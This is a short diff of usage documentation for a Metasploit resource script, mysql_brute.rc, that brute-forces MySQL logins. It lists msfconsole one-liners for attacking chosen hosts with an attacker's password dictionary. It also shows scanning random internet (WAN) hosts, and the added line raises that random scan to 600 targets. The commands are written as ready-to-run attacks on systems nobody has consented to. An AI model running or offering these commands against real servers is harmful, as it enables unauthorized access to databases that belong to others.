@@ -41,13 +41,17 @@
 
       msfconsole -q -x 'setg RANDOM_HOSTS true;setg RANDOM 300;resource /root/mysql_brute.rc'
 
-- instruct the resource script to use your own dicionary file (absoluct path required)
+- instruct the resource script to use attackers dicionary file (absoluct path required)
 
       msfconsole -q -x 'setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'
 
 - instruct the resource script to scan rhosts input by attacker, and use the attacker dicionary file 
 
       msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'
+
+- instruct the resource script to not clean database at exit scan WAN for rhosts and limmit search to 600 rhosts
+
+      msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg RANDOM 600;resource /root/mysql_brute.rc'
 
 <br /><br /><br />
 
